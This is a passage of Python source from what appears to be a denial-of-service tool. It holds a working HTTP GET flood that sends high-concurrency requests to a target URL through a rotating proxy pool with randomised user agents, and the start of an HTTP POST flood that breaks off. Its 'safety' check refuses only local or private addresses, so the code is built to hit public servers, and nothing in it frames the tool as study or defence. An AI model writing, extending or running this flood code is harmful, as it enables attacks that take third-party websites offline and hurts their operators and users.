class Methods:
    def __init__(self, proxy_pool: ProxyPool, safety: SafetyGuard):
        self.pool = proxy_pool
        self.safety = safety
        self.running = False
        self.stats = {
            "sent": 0,
            "success": 0,
            "fail": 0,
            "start": 0,
        }
        self.recent_proxies: List[str] = []  # last N proxy:region used
        self.target_label = ("", "", "")
        self._lock = threading.Lock()

    def _inc(self, key: str, n: int = 1):
        with self._lock:
            self.stats[key] += n

    def _track_proxy(self, proxy: Optional[str]):
        if not proxy:
            return
        ip = proxy.split(":")[0]
        code, city = ip_to_region(ip)
        entry = f"{city}|{ip}"
        with self._lock:
            self.recent_proxies.append(entry)
            if len(self.recent_proxies) > 12:
                self.recent_proxies = self.recent_proxies[-12:]

    async def http_flood(self, target: str, duration: int, concurrency: int):
        """Layer 7 HTTP GET flood via random proxies."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK: Target is local/private. Aborting.{C.END}")
            return

        url = target if target.startswith("http") else f"http://{target}"
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time()}
        end = time.time() + duration

        connector = aiohttp.TCPConnector(
            limit=0,
            ssl=False,
            force_close=True,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=6, connect=3, sock_read=3)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async def worker():
                while self.running and time.time() < end:
                    proxy = self.pool.get_random()
                    headers = {
                        "User-Agent": random.choice(USER_AGENTS),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Connection": "close",
                        "Cache-Control": "no-cache",
                    }
                    try:
                        kwargs = {"headers": headers, "ssl": False}
                        if proxy:
                            kwargs["proxy"] = f"http://{proxy}"
                        async with session.get(url, **kwargs) as resp:
                            await resp.release()
                            self._inc("sent")
                            self._track_proxy(proxy)
                            if resp.status < 500:
                                self._inc("success")
                                if proxy:
                                    self.pool.mark_good(proxy)
                            else:
                                self._inc("fail")
                    except Exception:
                        self._inc("fail")
                        if proxy:
                            self.pool.mark_bad(proxy)
                    await asyncio.sleep(0.01)

            tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            finally:
                self.running = False
                for t in tasks:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)
                await session.close()
                await connector.close()
                await asyncio.sleep(0.05)

        self.running = False

    async def http_post_flood(self, target: str, duration: int, concurrency: int):
        """Layer 7 HTTP POST flood with random payloads."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK: Target is local/private. Aborting.{C.END}")
            return

        url = target if target.startswith("http") else f"http://{target}"
        self.running = True
